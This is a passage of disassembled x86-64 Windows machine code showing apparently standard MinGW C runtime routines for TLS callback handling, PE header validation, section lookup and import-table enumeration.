   140003363:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
   14000336a:	00 
   14000336b:	48 8b 05 fe dd 00 00 	mov    0xddfe(%rip),%rax        # 0x140011170
   140003372:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003376:	eb 55                	jmp    0x1400033cd
   140003378:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000337c:	8b 00                	mov    (%rax),%eax
   14000337e:	39 45 10             	cmp    %eax,0x10(%rbp)
   140003381:	75 36                	jne    0x1400033b9
   140003383:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   140003388:	75 11                	jne    0x14000339b
   14000338a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000338e:	48 8b 40 10          	mov    0x10(%rax),%rax
   140003392:	48 89 05 d7 dd 00 00 	mov    %rax,0xddd7(%rip)        # 0x140011170
   140003399:	eb 10                	jmp    0x1400033ab
   14000339b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000339f:	48 8b 50 10          	mov    0x10(%rax),%rdx
   1400033a3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400033a7:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400033ab:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400033af:	48 89 c1             	mov    %rax,%rcx
   1400033b2:	e8 21 6d 00 00       	call   0x14000a0d8
   1400033b7:	eb 1b                	jmp    0x1400033d4
   1400033b9:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400033bd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400033c1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400033c5:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400033c9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400033cd:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   1400033d2:	75 a4                	jne    0x140003378
   1400033d4:	48 8d 05 65 dd 00 00 	lea    0xdd65(%rip),%rax        # 0x140011140
   1400033db:	48 89 c1             	mov    %rax,%rcx
   1400033de:	48 8b 05 cb ee 00 00 	mov    0xeecb(%rip),%rax        # 0x1400122b0
   1400033e5:	ff d0                	call   *%rax
   1400033e7:	b8 00 00 00 00       	mov    $0x0,%eax
   1400033ec:	48 83 c4 30          	add    $0x30,%rsp
   1400033f0:	5d                   	pop    %rbp
   1400033f1:	c3                   	ret
   1400033f2:	55                   	push   %rbp
   1400033f3:	48 89 e5             	mov    %rsp,%rbp
   1400033f6:	48 83 ec 30          	sub    $0x30,%rsp
   1400033fa:	8b 05 68 dd 00 00    	mov    0xdd68(%rip),%eax        # 0x140011168
   140003400:	85 c0                	test   %eax,%eax
   140003402:	0f 84 82 00 00 00    	je     0x14000348a
   140003408:	48 8d 05 31 dd 00 00 	lea    0xdd31(%rip),%rax        # 0x140011140
   14000340f:	48 89 c1             	mov    %rax,%rcx
   140003412:	48 8b 05 47 ee 00 00 	mov    0xee47(%rip),%rax        # 0x140012260
   140003419:	ff d0                	call   *%rax
   14000341b:	48 8b 05 4e dd 00 00 	mov    0xdd4e(%rip),%rax        # 0x140011170
   140003422:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003426:	eb 46                	jmp    0x14000346e
   140003428:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000342c:	8b 00                	mov    (%rax),%eax
   14000342e:	89 c1                	mov    %eax,%ecx
   140003430:	48 8b 05 a9 ee 00 00 	mov    0xeea9(%rip),%rax        # 0x1400122e0
   140003437:	ff d0                	call   *%rax
   140003439:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000343d:	48 8b 05 44 ee 00 00 	mov    0xee44(%rip),%rax        # 0x140012288
   140003444:	ff d0                	call   *%rax
   140003446:	85 c0                	test   %eax,%eax
   140003448:	75 18                	jne    0x140003462
   14000344a:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   14000344f:	74 11                	je     0x140003462
   140003451:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003455:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140003459:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000345d:	48 89 c1             	mov    %rax,%rcx
   140003460:	ff d2                	call   *%rdx
   140003462:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003466:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000346a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000346e:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   140003473:	75 b3                	jne    0x140003428
   140003475:	48 8d 05 c4 dc 00 00 	lea    0xdcc4(%rip),%rax        # 0x140011140
   14000347c:	48 89 c1             	mov    %rax,%rcx
   14000347f:	48 8b 05 2a ee 00 00 	mov    0xee2a(%rip),%rax        # 0x1400122b0
   140003486:	ff d0                	call   *%rax
   140003488:	eb 01                	jmp    0x14000348b
   14000348a:	90                   	nop
   14000348b:	48 83 c4 30          	add    $0x30,%rsp
   14000348f:	5d                   	pop    %rbp
   140003490:	c3                   	ret
   140003491:	55                   	push   %rbp
   140003492:	48 89 e5             	mov    %rsp,%rbp
   140003495:	48 83 ec 30          	sub    $0x30,%rsp
   140003499:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000349d:	89 55 18             	mov    %edx,0x18(%rbp)
   1400034a0:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   1400034a4:	83 7d 18 03          	cmpl   $0x3,0x18(%rbp)
   1400034a8:	0f 84 cc 00 00 00    	je     0x14000357a
   1400034ae:	83 7d 18 03          	cmpl   $0x3,0x18(%rbp)
   1400034b2:	0f 87 ca 00 00 00    	ja     0x140003582
   1400034b8:	83 7d 18 02          	cmpl   $0x2,0x18(%rbp)
   1400034bc:	0f 84 b1 00 00 00    	je     0x140003573
   1400034c2:	83 7d 18 02          	cmpl   $0x2,0x18(%rbp)
   1400034c6:	0f 87 b6 00 00 00    	ja     0x140003582
   1400034cc:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   1400034d0:	74 33                	je     0x140003505
   1400034d2:	83 7d 18 01          	cmpl   $0x1,0x18(%rbp)
   1400034d6:	0f 85 a6 00 00 00    	jne    0x140003582
   1400034dc:	8b 05 86 dc 00 00    	mov    0xdc86(%rip),%eax        # 0x140011168
   1400034e2:	85 c0                	test   %eax,%eax
   1400034e4:	75 13                	jne    0x1400034f9
   1400034e6:	48 8d 05 53 dc 00 00 	lea    0xdc53(%rip),%rax        # 0x140011140
   1400034ed:	48 89 c1             	mov    %rax,%rcx
   1400034f0:	48 8b 05 a9 ed 00 00 	mov    0xeda9(%rip),%rax        # 0x1400122a0
   1400034f7:	ff d0                	call   *%rax
   1400034f9:	c7 05 65 dc 00 00 01 	movl   $0x1,0xdc65(%rip)        # 0x140011168
   140003500:	00 00 00 
   140003503:	eb 7d                	jmp    0x140003582
   140003505:	e8 e8 fe ff ff       	call   0x1400033f2
   14000350a:	8b 05 58 dc 00 00    	mov    0xdc58(%rip),%eax        # 0x140011168
   140003510:	83 f8 01             	cmp    $0x1,%eax
   140003513:	75 6c                	jne    0x140003581
   140003515:	48 8b 05 54 dc 00 00 	mov    0xdc54(%rip),%rax        # 0x140011170
   14000351c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003520:	eb 20                	jmp    0x140003542
   140003522:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003526:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000352a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000352e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003532:	48 89 c1             	mov    %rax,%rcx
   140003535:	e8 9e 6b 00 00       	call   0x14000a0d8
   14000353a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000353e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003542:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   140003547:	75 d9                	jne    0x140003522
   140003549:	48 c7 05 1c dc 00 00 	movq   $0x0,0xdc1c(%rip)        # 0x140011170
   140003550:	00 00 00 00 
   140003554:	c7 05 0a dc 00 00 00 	movl   $0x0,0xdc0a(%rip)        # 0x140011168
   14000355b:	00 00 00 
   14000355e:	48 8d 05 db db 00 00 	lea    0xdbdb(%rip),%rax        # 0x140011140
   140003565:	48 89 c1             	mov    %rax,%rcx
   140003568:	48 8b 05 e9 ec 00 00 	mov    0xece9(%rip),%rax        # 0x140012258
   14000356f:	ff d0                	call   *%rax
   140003571:	eb 0e                	jmp    0x140003581
   140003573:	e8 48 f1 ff ff       	call   0x1400026c0
   140003578:	eb 08                	jmp    0x140003582
   14000357a:	e8 73 fe ff ff       	call   0x1400033f2
   14000357f:	eb 01                	jmp    0x140003582
   140003581:	90                   	nop
   140003582:	b8 01 00 00 00       	mov    $0x1,%eax
   140003587:	48 83 c4 30          	add    $0x30,%rsp
   14000358b:	5d                   	pop    %rbp
   14000358c:	c3                   	ret
   14000358d:	90                   	nop
   14000358e:	90                   	nop
   14000358f:	90                   	nop
   140003590:	55                   	push   %rbp
   140003591:	48 89 e5             	mov    %rsp,%rbp
   140003594:	48 83 ec 20          	sub    $0x20,%rsp
   140003598:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000359c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400035a0:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400035a4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400035a8:	0f b7 00             	movzwl (%rax),%eax
   1400035ab:	66 3d 4d 5a          	cmp    $0x5a4d,%ax
   1400035af:	74 07                	je     0x1400035b8
   1400035b1:	b8 00 00 00 00       	mov    $0x0,%eax
   1400035b6:	eb 4e                	jmp    0x140003606
   1400035b8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400035bc:	8b 40 3c             	mov    0x3c(%rax),%eax
   1400035bf:	48 63 d0             	movslq %eax,%rdx
   1400035c2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400035c6:	48 01 d0             	add    %rdx,%rax
   1400035c9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400035cd:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400035d1:	8b 00                	mov    (%rax),%eax
   1400035d3:	3d 50 45 00 00       	cmp    $0x4550,%eax
   1400035d8:	74 07                	je     0x1400035e1
   1400035da:	b8 00 00 00 00       	mov    $0x0,%eax
   1400035df:	eb 25                	jmp    0x140003606
   1400035e1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400035e5:	48 83 c0 18          	add    $0x18,%rax
   1400035e9:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400035ed:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400035f1:	0f b7 00             	movzwl (%rax),%eax
   1400035f4:	66 3d 0b 02          	cmp    $0x20b,%ax
   1400035f8:	74 07                	je     0x140003601
   1400035fa:	b8 00 00 00 00       	mov    $0x0,%eax
   1400035ff:	eb 05                	jmp    0x140003606
   140003601:	b8 01 00 00 00       	mov    $0x1,%eax
   140003606:	48 83 c4 20          	add    $0x20,%rsp
   14000360a:	5d                   	pop    %rbp
   14000360b:	c3                   	ret
   14000360c:	55                   	push   %rbp
   14000360d:	48 89 e5             	mov    %rsp,%rbp
   140003610:	48 83 ec 20          	sub    $0x20,%rsp
   140003614:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140003618:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   14000361c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003620:	8b 40 3c             	mov    0x3c(%rax),%eax
   140003623:	48 63 d0             	movslq %eax,%rdx
   140003626:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000362a:	48 01 d0             	add    %rdx,%rax
   14000362d:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140003631:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
   140003638:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000363c:	0f b7 40 14          	movzwl 0x14(%rax),%eax
   140003640:	0f b7 d0             	movzwl %ax,%edx
   140003643:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140003647:	48 01 d0             	add    %rdx,%rax
   14000364a:	48 83 c0 18          	add    $0x18,%rax
   14000364e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003652:	eb 36                	jmp    0x14000368a
   140003654:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003658:	8b 40 0c             	mov    0xc(%rax),%eax
   14000365b:	89 c0                	mov    %eax,%eax
   14000365d:	48 39 45 18          	cmp    %rax,0x18(%rbp)
   140003661:	72 1e                	jb     0x140003681
   140003663:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003667:	8b 50 0c             	mov    0xc(%rax),%edx
   14000366a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000366e:	8b 40 08             	mov    0x8(%rax),%eax
   140003671:	01 d0                	add    %edx,%eax
   140003673:	89 c0                	mov    %eax,%eax
   140003675:	48 39 45 18          	cmp    %rax,0x18(%rbp)
   140003679:	73 06                	jae    0x140003681
   14000367b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000367f:	eb 1e                	jmp    0x14000369f
   140003681:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
   140003685:	48 83 45 f8 28       	addq   $0x28,-0x8(%rbp)
   14000368a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000368e:	0f b7 40 06          	movzwl 0x6(%rax),%eax
   140003692:	0f b7 c0             	movzwl %ax,%eax
   140003695:	39 45 f4             	cmp    %eax,-0xc(%rbp)
   140003698:	72 ba                	jb     0x140003654
   14000369a:	b8 00 00 00 00       	mov    $0x0,%eax
   14000369f:	48 83 c4 20          	add    $0x20,%rsp
   1400036a3:	5d                   	pop    %rbp
   1400036a4:	c3                   	ret
   1400036a5:	55                   	push   %rbp
   1400036a6:	48 89 e5             	mov    %rsp,%rbp
   1400036a9:	48 83 ec 40          	sub    $0x40,%rsp
   1400036ad:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   1400036b1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400036b5:	48 89 c1             	mov    %rax,%rcx
   1400036b8:	e8 6b 6a 00 00       	call   0x14000a128
   1400036bd:	48 83 f8 08          	cmp    $0x8,%rax
   1400036c1:	76 0a                	jbe    0x1400036cd
   1400036c3:	b8 00 00 00 00       	mov    $0x0,%eax
   1400036c8:	e9 98 00 00 00       	jmp    0x140003765
   1400036cd:	48 8b 05 1c 90 00 00 	mov    0x901c(%rip),%rax        # 0x14000c6f0
   1400036d4:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400036d8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400036dc:	48 89 c1             	mov    %rax,%rcx
   1400036df:	e8 ac fe ff ff       	call   0x140003590
   1400036e4:	85 c0                	test   %eax,%eax
   1400036e6:	75 07                	jne    0x1400036ef
   1400036e8:	b8 00 00 00 00       	mov    $0x0,%eax
   1400036ed:	eb 76                	jmp    0x140003765
   1400036ef:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400036f3:	8b 40 3c             	mov    0x3c(%rax),%eax
   1400036f6:	48 63 d0             	movslq %eax,%rdx
   1400036f9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400036fd:	48 01 d0             	add    %rdx,%rax
   140003700:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140003704:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
   14000370b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000370f:	0f b7 40 14          	movzwl 0x14(%rax),%eax
   140003713:	0f b7 d0             	movzwl %ax,%edx
   140003716:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000371a:	48 01 d0             	add    %rdx,%rax
   14000371d:	48 83 c0 18          	add    $0x18,%rax
   140003721:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003725:	eb 29                	jmp    0x140003750
   140003727:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000372b:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000372f:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140003735:	48 89 c1             	mov    %rax,%rcx
   140003738:	e8 f3 69 00 00       	call   0x14000a130
   14000373d:	85 c0                	test   %eax,%eax
   14000373f:	75 06                	jne    0x140003747
   140003741:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003745:	eb 1e                	jmp    0x140003765
   140003747:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
   14000374b:	48 83 45 f8 28       	addq   $0x28,-0x8(%rbp)
   140003750:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140003754:	0f b7 40 06          	movzwl 0x6(%rax),%eax
   140003758:	0f b7 c0             	movzwl %ax,%eax
   14000375b:	39 45 f4             	cmp    %eax,-0xc(%rbp)
   14000375e:	72 c7                	jb     0x140003727
   140003760:	b8 00 00 00 00       	mov    $0x0,%eax
   140003765:	48 83 c4 40          	add    $0x40,%rsp
   140003769:	5d                   	pop    %rbp
   14000376a:	c3                   	ret
   14000376b:	55                   	push   %rbp
   14000376c:	48 89 e5             	mov    %rsp,%rbp
   14000376f:	48 83 ec 30          	sub    $0x30,%rsp
   140003773:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140003777:	48 8b 05 72 8f 00 00 	mov    0x8f72(%rip),%rax        # 0x14000c6f0
   14000377e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003782:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003786:	48 89 c1             	mov    %rax,%rcx
   140003789:	e8 02 fe ff ff       	call   0x140003590
   14000378e:	85 c0                	test   %eax,%eax
   140003790:	75 07                	jne    0x140003799
   140003792:	b8 00 00 00 00       	mov    $0x0,%eax
   140003797:	eb 1c                	jmp    0x1400037b5
   140003799:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000379d:	48 2b 45 f8          	sub    -0x8(%rbp),%rax
   1400037a1:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400037a5:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   1400037a9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400037ad:	48 89 c1             	mov    %rax,%rcx
   1400037b0:	e8 57 fe ff ff       	call   0x14000360c
   1400037b5:	48 83 c4 30          	add    $0x30,%rsp
   1400037b9:	5d                   	pop    %rbp
   1400037ba:	c3                   	ret
   1400037bb:	55                   	push   %rbp
   1400037bc:	48 89 e5             	mov    %rsp,%rbp
   1400037bf:	48 83 ec 30          	sub    $0x30,%rsp
   1400037c3:	48 8b 05 26 8f 00 00 	mov    0x8f26(%rip),%rax        # 0x14000c6f0
   1400037ca:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400037ce:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400037d2:	48 89 c1             	mov    %rax,%rcx
   1400037d5:	e8 b6 fd ff ff       	call   0x140003590
   1400037da:	85 c0                	test   %eax,%eax
   1400037dc:	75 07                	jne    0x1400037e5
   1400037de:	b8 00 00 00 00       	mov    $0x0,%eax
   1400037e3:	eb 20                	jmp    0x140003805
   1400037e5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400037e9:	8b 40 3c             	mov    0x3c(%rax),%eax
   1400037ec:	48 63 d0             	movslq %eax,%rdx
   1400037ef:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400037f3:	48 01 d0             	add    %rdx,%rax
   1400037f6:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400037fa:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400037fe:	0f b7 40 06          	movzwl 0x6(%rax),%eax
   140003802:	0f b7 c0             	movzwl %ax,%eax
   140003805:	48 83 c4 30          	add    $0x30,%rsp
   140003809:	5d                   	pop    %rbp
   14000380a:	c3                   	ret
   14000380b:	55                   	push   %rbp
   14000380c:	48 89 e5             	mov    %rsp,%rbp
   14000380f:	48 83 ec 40          	sub    $0x40,%rsp
   140003813:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140003817:	48 8b 05 d2 8e 00 00 	mov    0x8ed2(%rip),%rax        # 0x14000c6f0
   14000381e:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140003822:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140003826:	48 89 c1             	mov    %rax,%rcx
   140003829:	e8 62 fd ff ff       	call   0x140003590
   14000382e:	85 c0                	test   %eax,%eax
   140003830:	75 07                	jne    0x140003839
   140003832:	b8 00 00 00 00       	mov    $0x0,%eax
   140003837:	eb 78                	jmp    0x1400038b1
   140003839:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000383d:	8b 40 3c             	mov    0x3c(%rax),%eax
   140003840:	48 63 d0             	movslq %eax,%rdx
   140003843:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140003847:	48 01 d0             	add    %rdx,%rax
   14000384a:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000384e:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
   140003855:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140003859:	0f b7 40 14          	movzwl 0x14(%rax),%eax
   14000385d:	0f b7 d0             	movzwl %ax,%edx
   140003860:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140003864:	48 01 d0             	add    %rdx,%rax
   140003867:	48 83 c0 18          	add    $0x18,%rax
   14000386b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000386f:	eb 2b                	jmp    0x14000389c
   140003871:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003875:	8b 40 24             	mov    0x24(%rax),%eax
   140003878:	25 00 00 00 20       	and    $0x20000000,%eax
   14000387d:	85 c0                	test   %eax,%eax
   14000387f:	74 12                	je     0x140003893
   140003881:	48 83 7d 10 00       	cmpq   $0x0,0x10(%rbp)
   140003886:	75 06                	jne    0x14000388e
   140003888:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000388c:	eb 23                	jmp    0x1400038b1
   14000388e:	48 83 6d 10 01       	subq   $0x1,0x10(%rbp)
   140003893:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
   140003897:	48 83 45 f8 28       	addq   $0x28,-0x8(%rbp)
   14000389c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   1400038a0:	0f b7 40 06          	movzwl 0x6(%rax),%eax
   1400038a4:	0f b7 c0             	movzwl %ax,%eax
   1400038a7:	39 45 f4             	cmp    %eax,-0xc(%rbp)
   1400038aa:	72 c5                	jb     0x140003871
   1400038ac:	b8 00 00 00 00       	mov    $0x0,%eax
   1400038b1:	48 83 c4 40          	add    $0x40,%rsp
   1400038b5:	5d                   	pop    %rbp
   1400038b6:	c3                   	ret
   1400038b7:	55                   	push   %rbp
   1400038b8:	48 89 e5             	mov    %rsp,%rbp
   1400038bb:	48 83 ec 30          	sub    $0x30,%rsp
   1400038bf:	48 8b 05 2a 8e 00 00 	mov    0x8e2a(%rip),%rax        # 0x14000c6f0
   1400038c6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400038ca:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400038ce:	48 89 c1             	mov    %rax,%rcx
   1400038d1:	e8 ba fc ff ff       	call   0x140003590
   1400038d6:	85 c0                	test   %eax,%eax
   1400038d8:	75 07                	jne    0x1400038e1
   1400038da:	b8 00 00 00 00       	mov    $0x0,%eax
   1400038df:	eb 04                	jmp    0x1400038e5
   1400038e1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400038e5:	48 83 c4 30          	add    $0x30,%rsp
   1400038e9:	5d                   	pop    %rbp
   1400038ea:	c3                   	ret
   1400038eb:	55                   	push   %rbp
   1400038ec:	48 89 e5             	mov    %rsp,%rbp
   1400038ef:	48 83 ec 40          	sub    $0x40,%rsp
   1400038f3:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   1400038f7:	48 8b 05 f2 8d 00 00 	mov    0x8df2(%rip),%rax        # 0x14000c6f0
   1400038fe:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003902:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003906:	48 89 c1             	mov    %rax,%rcx
   140003909:	e8 82 fc ff ff       	call   0x140003590
   14000390e:	85 c0                	test   %eax,%eax
   140003910:	75 07                	jne    0x140003919
   140003912:	b8 00 00 00 00       	mov    $0x0,%eax
   140003917:	eb 3d                	jmp    0x140003956
   140003919:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000391d:	48 2b 45 f8          	sub    -0x8(%rbp),%rax
   140003921:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003925:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140003929:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000392d:	48 89 c1             	mov    %rax,%rcx
   140003930:	e8 d7 fc ff ff       	call   0x14000360c
   140003935:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140003939:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
   14000393e:	75 07                	jne    0x140003947
   140003940:	b8 00 00 00 00       	mov    $0x0,%eax
   140003945:	eb 0f                	jmp    0x140003956
   140003947:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000394b:	8b 40 24             	mov    0x24(%rax),%eax
   14000394e:	f7 d0                	not    %eax
   140003950:	c1 e8 1f             	shr    $0x1f,%eax
   140003953:	0f b6 c0             	movzbl %al,%eax
   140003956:	48 83 c4 40          	add    $0x40,%rsp
   14000395a:	5d                   	pop    %rbp
   14000395b:	c3                   	ret
   14000395c:	55                   	push   %rbp
   14000395d:	48 89 e5             	mov    %rsp,%rbp
   140003960:	48 83 ec 50          	sub    $0x50,%rsp
   140003964:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140003967:	48 8b 05 82 8d 00 00 	mov    0x8d82(%rip),%rax        # 0x14000c6f0
   14000396e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003972:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003976:	48 89 c1             	mov    %rax,%rcx
   140003979:	e8 12 fc ff ff       	call   0x140003590
   14000397e:	85 c0                	test   %eax,%eax
   140003980:	75 0a                	jne    0x14000398c
   140003982:	b8 00 00 00 00       	mov    $0x0,%eax
   140003987:	e9 ab 00 00 00       	jmp    0x140003a37
   14000398c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003990:	8b 40 3c             	mov    0x3c(%rax),%eax
   140003993:	48 63 d0             	movslq %eax,%rdx
   140003996:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000399a:	48 01 d0             	add    %rdx,%rax
   14000399d:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400039a1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400039a5:	8b 80 90 00 00 00    	mov    0x90(%rax),%eax
   1400039ab:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   1400039ae:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
   1400039b2:	75 07                	jne    0x1400039bb
   1400039b4:	b8 00 00 00 00       	mov    $0x0,%eax
   1400039b9:	eb 7c                	jmp    0x140003a37
   1400039bb:	8b 55 e4             	mov    -0x1c(%rbp),%edx
   1400039be:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400039c2:	48 89 c1             	mov    %rax,%rcx
   1400039c5:	e8 42 fc ff ff       	call   0x14000360c
   1400039ca:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   1400039ce:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   1400039d3:	75 07                	jne    0x1400039dc
   1400039d5:	b8 00 00 00 00       	mov    $0x0,%eax
   1400039da:	eb 5b                	jmp    0x140003a37
   1400039dc:	8b 55 e4             	mov    -0x1c(%rbp),%edx
   1400039df:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400039e3:	48 01 d0             	add    %rdx,%rax
   1400039e6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400039ea:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   1400039ef:	75 07                	jne    0x1400039f8
   1400039f1:	b8 00 00 00 00       	mov    $0x0,%eax
   1400039f6:	eb 3f                	jmp    0x140003a37
   1400039f8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400039fc:	8b 40 04             	mov    0x4(%rax),%eax
   1400039ff:	85 c0                	test   %eax,%eax
   140003a01:	75 0b                	jne    0x140003a0e
   140003a03:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003a07:	8b 40 0c             	mov    0xc(%rax),%eax
   140003a0a:	85 c0                	test   %eax,%eax
   140003a0c:	74 23                	je     0x140003a31
   140003a0e:	83 7d 10 00          	cmpl   $0x0,0x10(%rbp)
   140003a12:	7f 12                	jg     0x140003a26
   140003a14:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003a18:	8b 40 0c             	mov    0xc(%rax),%eax
   140003a1b:	89 c2                	mov    %eax,%edx
   140003a1d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003a21:	48 01 d0             	add    %rdx,%rax
   140003a24:	eb 11                	jmp    0x140003a37
   140003a26:	83 6d 10 01          	subl   $0x1,0x10(%rbp)
   140003a2a:	48 83 45 f8 14       	addq   $0x14,-0x8(%rbp)
   140003a2f:	eb c7                	jmp    0x1400039f8
   140003a31:	90                   	nop
   140003a32:	b8 00 00 00 00       	mov    $0x0,%eax
   140003a37:	48 83 c4 50          	add    $0x50,%rsp
   140003a3b:	5d                   	pop    %rbp
